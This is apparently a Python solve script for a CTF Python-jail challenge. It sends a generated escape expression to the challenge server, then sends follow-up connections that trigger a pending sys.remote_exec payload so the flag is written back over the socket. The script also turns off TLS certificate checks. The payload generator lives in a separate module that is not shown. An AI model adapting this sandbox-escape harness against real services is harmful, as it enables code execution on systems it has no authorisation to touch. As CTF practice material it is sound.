#!/usr/bin/env python3
"""
The pyjail. Sends the eval expression, then END, then reads the flag back.
    ctf-python solve/solve.py HOST PORT
"""
import re
import socket
import sys
import time

sys.path.insert(0, __file__.rsplit('/', 1)[0])
import gen  # noqa: E402

FLAG_RE = re.compile(rb'TFCCTF\{[^}\n]*\}')


CACHE = __file__.rsplit('/', 1)[0] + '/../scratch/expr.txt'


EXPR_FILE = None


def build_cached(cmd):
    """Generation takes a couple of minutes, so reuse the cached expression
    when it was built for this exact command."""
    import os
    if EXPR_FILE:
        return open(EXPR_FILE).read().strip(), -1
    if cmd == gen.CMD and os.path.exists(CACHE):
        e = open(CACHE).read().strip()
        if e:
            return e, -1
    expr, n = gen.build(cmd)
    if cmd == gen.CMD:
        open(CACHE, 'w').write(expr)
    return expr, n


def connect(host, port, tls=False):
    s = socket.create_connection((host, int(port)), timeout=15)
    if tls:
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        # the ingress routes on SNI, so server_hostname is mandatory
        s = ctx.wrap_socket(s, server_hostname=host)
    return s


def run(host, port, cmd=gen.CMD, wait=8.0, verbose=True, tls=False):
    expr, nparts = build_cached(cmd)
    if verbose:
        print('[*] cmd  : %s' % cmd)
        print('[*] expr : %d bytes, %d join pieces' % (len(expr), nparts))
        print('[*] tls  : %s' % tls)
    s = connect(host, port, tls)
    time.sleep(0.4)
    banner = b''
    s.settimeout(3)
    try:
        banner = s.recv(4096)
    except Exception:
        pass
    if verbose:
        print('[*] banner: %r' % banner)
    s.sendall(expr.encode())
    # END must land in a recv() of its own, so give the payload time to drain.
    time.sleep(1.5)
    s.sendall(b'END')
    time.sleep(1.0)
    s.sendall(b'END')          # harmless retry if the first one got coalesced

    socks = [s]
    buf = b''

    def drain(seconds):
        nonlocal buf
        end = time.time() + seconds
        while time.time() < end and not FLAG_RE.search(buf):
            for so in socks:
                try:
                    so.settimeout(0.3)
                    d = so.recv(65536)
                except Exception:
                    continue
                if d:
                    buf += d

    # Normal path: jail.py returns from its one second sleep, runs bytecode,
    # and the pending sys.remote_exec script fires while our socket is still
    # the current client_socket.
    drain(wait)

    # Fallback: on a slow node the child may not have called remote_exec before
    # jail.py blocked in accept(), so the script is still pending.  Each new
    # connection makes jail.py interpret again, which triggers it.  The script
    # writes to every fd, so the flag lands on whichever socket is live.
    if not FLAG_RE.search(buf):
        for i in range(4):
            try:
                t = connect(host, port, tls)
                t.sendall(b'sys')
                time.sleep(0.4)
                t.sendall(b'END')
                socks.append(t)
            except Exception as e:
                if verbose:
                    print('[!] poke %d failed: %r' % (i, e))
            drain(3.0)
            if FLAG_RE.search(buf):
                break

    for so in socks:
        try:
            so.close()
        except Exception:
            pass
    return banner + buf


if __name__ == '__main__':
    args = [a for a in sys.argv[1:] if not a.startswith('--')]
    cmd = gen.CMD
    if '--cmd' in sys.argv:
        cmd = sys.argv[sys.argv.index('--cmd') + 1]
        args = [a for a in args if a != cmd]
    if '--expr' in sys.argv:
        EXPR_FILE = sys.argv[sys.argv.index('--expr') + 1]
        args = [a for a in args if a != EXPR_FILE]
        globals()['EXPR_FILE'] = EXPR_FILE
        cmd = gen.CMD_SOCKET
    host = args[0] if args else '127.0.0.1'
    port = args[1] if len(args) > 1 else '12340'
    out = b''
    for tls in ([True] if '--tls' in sys.argv else [False, True]):
        try:
            out = run(host, port, cmd, tls=tls)
        except Exception as e:
            print('[!] transport error (tls=%s): %r' % (tls, e))
            continue
        print('[*] received %d bytes' % len(out))
        print(out.decode('utf-8', 'replace'))
        if FLAG_RE.search(out):
            break
        # a plaintext HTTP error means the ingress wants TLS with SNI
        if b'Send your code' in out:
            break
        print('[!] no jail banner, retrying with TLS + SNI')
    m = FLAG_RE.search(out)
    if m:
        print('[+] FLAG: %s' % m.group().decode())
    else:
        print('[-] no flag in response')
